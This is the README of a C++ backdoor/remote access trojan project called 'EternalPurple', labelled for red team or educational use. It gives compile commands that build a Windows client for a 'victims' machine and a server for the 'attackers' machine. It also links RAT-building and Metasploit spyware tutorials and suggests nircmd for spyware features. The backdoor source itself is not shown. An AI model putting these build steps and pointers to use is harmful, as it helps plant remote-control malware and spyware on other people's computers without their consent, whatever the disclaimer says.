# C++ Backdoor/RAT </br>
## _Red Team / Educational use ONLY_ </br>

### How to Use</br>
Compile client for victims windows machine:
```sh
i686-w64-mingw32-gcc -o /home/kali/Documents/EternalPurple/bin/client/fun2.exe /home/kali/Documents/EternalPurple/backdoor.c -lwsock32 -lwininet
```

Compile server for linux attackers machine:
```sh
gcc /home/kali/Documents/EternalPurple/server.c -o /home/kali/Documents/EternalPurple/bin/server/server.exe
```


Commands assume that you have a linux OS and mingw installed
Also that you have backdoor.c and server.c on a Folder Called EternalPurple on your Documents


#### Functionalities: </br>

thanks to  • SCHØØL ZERØ • for tutorials on how to do this
https://www.youtube.com/c/SCHØØLZERØ
Playlist Creating similar RAT<br>
https://youtube.com/playlist?list=PLSqjYSJtqeaV1Hdk2ZVnr90KpDObfzDSs
https://youtu.be/6Dc8i1NQhCM
Easy metasploit spyware:
https://youtu.be/V67VIQB7N0w

#### Other
To gain spyware functionalities you can use nircmd: https://www.nirsoft.net/utils/nircmd.html
